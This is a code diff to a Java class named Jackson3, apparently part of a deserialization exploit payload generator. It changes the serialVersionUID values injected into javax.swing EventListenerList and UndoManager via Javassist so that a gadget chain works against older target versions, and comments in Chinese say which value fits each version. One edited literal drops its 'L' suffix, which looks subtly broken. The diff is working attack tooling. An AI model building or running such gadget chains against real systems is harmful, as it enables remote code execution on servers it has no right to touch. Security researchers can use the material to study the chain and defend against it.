@@ -56,15 +56,17 @@ public class Jackson3 implements ObjectPayload<Object> {
 
     public static Object getEventListenerList(Object obj) throws Exception {
         //>=6.1.0 为-7977902244297240866
-        //<=6.0.23为
+        //<=6.0.23为-5677132037850737084
         CtClass ctEventListenerList = insertField(
-                "javax.swing.event.EventListenerList", "private static final long serialVersionUID = -7977902244297240866L;");
+                "javax.swing.event.EventListenerList",
+                "private static final long serialVersionUID = -5677132037850737084;");
         Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();
 
         //>=6.1.0 为-1045223116463488483
-        //<=6.0.23为
+        //<=6.0.23为-2077529998244066750
         CtClass ctUndoManager = insertField(
-                "javax.swing.undo.UndoManager", "private static final long serialVersionUID = -1045223116463488483L;");
+                "javax.swing.undo.UndoManager",
+                "private static final long serialVersionUID = -2077529998244066750L;");
         Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();
 
         //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
